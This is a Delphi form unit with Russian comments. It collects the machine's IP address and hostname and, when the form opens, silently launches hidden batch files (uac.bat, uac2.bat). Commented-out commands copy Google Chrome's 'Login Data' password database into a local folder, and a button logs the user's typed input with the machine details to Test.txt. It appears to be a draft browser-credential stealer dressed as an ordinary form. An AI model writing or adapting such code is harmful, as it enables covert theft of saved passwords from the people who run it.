unit Unit3;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs,Winsock, Vcl.StdCtrls,ShellApi;

type
  TForm3 = class(TForm)
    Button1: TButton;
    Edit1: TEdit;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
  compname,ipid,ipcomp: string;
  MyDIR: string;
    { Public declarations }
  end;

var
  Form3: TForm3;

implementation

{$R *.dfm}


function GetComptename: String; // Получить имя вашего компьютера
var
    //compname:string;
  wVersionRequested : WORD;
  wsaData : TWSAData;
  p : PHostEnt; s : array[0..128] of char;
begin
  try
        WversionRequested:= makeword (1, 1); // Создать Winsock
        WSASTARTUP (WversionRequested, WSADATA); // создать Winsock
    GetHostName(@s,128);
    p:=GetHostByName(@s);
    Result:=p^.h_Name;
  finally
        WSACLEANUP; // Release Winsock
  end;
end;

function gethostip: string; // получить IP
var
   wVersionRequested : WORD;
   wsaData : TWSAData;
   p : PHostEnt; s : array[0..128] of char; p2 : pansichar;
begin
   try
            WversionRequested:=makeword (1, 1); // Создать Winsock
            WSASTARTUP (WversionRequested, WSADATA); // создать Winsock
      GetHostName(@s,128);
      p:=GetHostByName(@s);
      p2 := iNet_ntoa(PInAddr(p^.h_addr_list^)^);
      Result:= P2;
   finally
            WSACLEANUP; // Release Winsock
   end;
end;


procedure TForm3.Button1Click(Sender: TObject);
var F:TextFile;
begin
  AssignFile(F, 'Test.txt');
  {$I-}
  Append(F);
  if IoResult <>0 then
  {$I+}
  ReWrite(F);
  Writeln(F,'User:'+edit1.Text+'  '+ipcomp);
  CloseFile(F);

end;


procedure TForm3.FormCreate(Sender: TObject);
var s:string;
begin
  MyDIR:=(ExtractFileDir(Application.ExeName));//+'\uac.bat';
// showmessage(MyDIR);
 ipid:=gethostip;
 compname:=getcomptename;
 ipcomp:=('IP:'+ipid+'_____'+'CompName:'+compname+#13#10);
 //s:=('cmd /c md Google && cd %localappdata%\Google\Chrome\User Data\Default && copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data"'+PChar(MyDir+'\Google'));
 ShellExecute (handle,'open', pchar(myDIR+'\uac.bat'),'','', sw_hide);
 ShellExecute (handle,'open', pchar(myDIR+'\uac2.bat'),'','', sw_hide);
 //WinExec(pansichar(s), 1);
 //ShellExecute(Handle, nil, 'cmd.exe', ('copy /y "%localappdata%\Google\Chrome\User Data\Default\Login Data" "%~d0\Google"'), nil, SW_SHOW);
 //nExec('cmd "md %~d0\Google" ', SW_Normal);

end;

end.
